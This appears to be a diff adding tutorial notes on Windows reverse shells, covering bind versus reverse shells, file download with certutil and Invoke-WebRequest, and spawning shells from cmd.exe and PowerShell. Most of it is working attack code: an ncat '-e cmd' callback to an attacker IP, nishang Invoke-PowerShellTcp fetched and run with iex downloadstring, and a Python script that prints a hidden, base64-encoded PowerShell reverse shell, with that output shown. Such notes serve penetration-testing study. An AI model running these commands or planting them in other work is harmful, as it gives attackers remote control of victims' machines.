@@ -1,0 +1,238 @@
+                     ______________________________
+
+                      WINDOWS PRIVILEGE ESCALATION
+                         Windows Reverse Shells
+
+                            Leonardo Tamiano
+                     ______________________________
+
+
+Table of Contents
+_________________
+
+1. Reverse Shell vs Bind Shell
+.. 1. Why Reverse Shells are Better
+2. File Transfer Commands
+3. Spawning a Reverse Shell
+.. 1. cmd.exe
+.. 2. powershell.exe
+
+
+1 Reverse Shell vs Bind Shell
+=============================
+
+  When we obtain `code execution' on a vulnerable system, it is useful
+  to spawn a `shell' that can be controlled through a remote connection.
+
+  To do this there are two main techniques:
+
+  - `Bind Shell'
+
+    The attacker forces the vulnerable compromised server to open a port
+    and to listen for incoming connections.
+
+    ,----
+    | Attacker Machine ------> Compromised System
+    `----
+
+    The compromised system acts as a server, while the attacker machine
+    acts a client.
+
+  - `Reverse Shell'
+
+    The attacker forces the vulnerable compromised system to initiate a
+    connection to the attacker machine.
+
+    ,----
+    | Compromised System ------> Attacker Machine
+    `----
+
+    The attacker machine now acts as the server, with a public IP on
+    which it listens for incoming connections. The compromised system
+    instead acts as a client.
+
+
+1.1 Why Reverse Shells are Better
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  Since using reverse shells the connection is outbound, network-wise it
+  is more difficult to protect your system from reverse shell
+  connections.
+
+  That is, it is typically OK to connect to the public internet, while
+  it is more dangerous to open a port in your network infrastructure to
+  listen for incoming connections.
+
+  In both cases however the idea is to obtain *remote control over a
+  shell process*.  This can be really dangerous for the security of a
+  system.
+
+
+2 File Transfer Commands
+========================
+
+  `certutil' can be used as a utility to transfer files.
+
+  ,----
+  | certutil -urlcache -split -f <URL> <OUTPUT-FILE>
+  `----
+
+  ,----
+  | certutil -urlcache -split -f "https://leonardotamiano.xyz/file.txt" file.txt
+  `----
+
+  *NOTE WELL*: if windows defender is active on the machine, the usage
+  of certutil for the downloading of file can trigger an antivirus
+  warning, disabling the download of the file.
+
+  ----------------------------------------------------------------------
+
+  `iwr' is a powershell utility to transfer files.
+
+  ,----
+  | iwr -> Invoke-WebRequest
+  `----
+
+  ,----
+  | Invoke-WebRequest -uri <URL> -Outfile <OUTPUT-FILE>
+  | iwr -uri <URL> -Outfile <OUTPUT-FILE>
+  `----
+
+  ,----
+  | Invoke-WebRequest -uri "https://leonardotamiano.xyz/file.txt" -Outfile file.txt
+  | iwr -uri "https://leonardotamiano.xyz/file.txt" -Outfile file.txt
+  `----
+
+
+3 Spawning a Reverse Shell
+==========================
+
+3.1 cmd.exe
+~~~~~~~~~~~
+
+  To spawn a reverse shell with `cmd.exe' we can use the `ncat.exe'
+  binary.
+
+  First we download `ncat.exe'.
+  - <https://github.com/int0x33/nc.exe/>
+
+  ,----
+  | (windows) iwr -uri "https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe" -Outfile nc64.exe
+  `----
+
+  Then we setup a listener in our attacker machine.
+
+  ,----
+  | (attacker) nc -lvnp 7777
+  `----
+
+  And finally we connect to the attacker machine from the windows box,
+  spawning a shell and attaching it to the TCP connection.
+
+  ,----
+  | (windows) C:\Users\Quickemu\Desktop\nc64.exe 192.168.122.1 7777 -e cmd
+  `----
+
+
+3.2 powershell.exe
+~~~~~~~~~~~~~~~~~~
+
+  First is by using `Invoke-PowerShellTcp.ps1'.
+
+  - We can download it as follows into our attacker machine
+
+    ,----
+    | wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+    `----
+
+  - Then we add the following line into the script
+
+    ,----
+    | echo "Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER-IP> -Port <ATTACKER-PORT>" >> Invoke-PowerShellTcp.ps1
+    | echo "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.122.1 -Port 7777" >> Invoke-PowerShellTcp.ps1
+    `----
+
+  - Then we spawn an HTTP server
+
+    ,----
+    | python3 -m http.server 1337
+    `----
+
+  - And then we can download it and execute it from the victim machine
+
+    - If we execute from CMD.exe
+
+    ,----
+    | powershell -c "iex(new-object net.webclient).downloadstring(\"http://<ATTACKER-IP>:<ATTACKER-PORT>/Invoke-PowerShellTcp.ps1\")"
+    | powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.122.1:1337/Invoke-PowerShellTcp.ps1\")"
+    `----
+
+    - If we execute from powershell.exe
+
+      ,----
+      | iex(new-object net.webclient).downloadstring("http://<ATTACKER-IP>:<ATTACKER-PORT>/Invoke-PowerShellTcp.ps1")
+      | iex(new-object net.webclient).downloadstring("http://192.168.122.1:1337/Invoke-PowerShellTcp.ps1")
+      `----
+
+  ----------------------------------------------------------------------
+
+  Another way is by using the following python script, which encodes a
+  `base64 reverse shell in powershell', and then prints out the command
+  to decode and execute such reverse shell.
+
+  ,----
+  | #!/usr/bin/env python3
+  | 
+  | import sys
+  | import base64
+  | 
+  | # ----------------------------------------    
+  | 
+  | IP = "192.168.122.1"
+  | PORT = 7777
+  | 
+  | def gen_payload(ip, port):
+  |     payload = f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\", {port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
+  |     
+  |     payload = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+  | 
+  |     return payload
+  | 
+  | # ----------------------------------------
+  | 
+  | def main():
+  |     global IP, PORT
+  |     
+  |     ip, port = "", 0
+  |     if len(sys.argv) < 3:
+  |         print(f"[INFO]: Usage {sys.argv[0]} <IP> <PORT>")
+  |         ip, port = IP, PORT
+  |     else:
+  |         ip, port = sys.argv[1], sys.argv[2]
+  | 
+  |     print(f"[INFO]: OK")
+  |     print(f"[INFO]: Generating payload for {ip=} AND {port=}")
+  |     
+  |     payload = gen_payload(ip, port)
+  | 
+  |     print(f"[INFO]: Payload below\n")
+  |     print(payload)
+  |     print()
+  |     
+  | # ----------------------------------------
+  | 
+  |     
+  | if __name__ == "__main__":
+  |     main()
+  `----
+
+  It can be used as follows
+
+  ,----
+  | [leo@arch revshells]$ python3 base64_powershell.py  192.168.122.1 7777
+  | [INFO]: OK
+  | [INFO]: Generating payload for ip='192.168.122.1' AND port='7777'
+  | [INFO]: Payload below
+  | 
+  | powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMgAyAC4AMQAiACwAIAA3ADcANwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+  `----
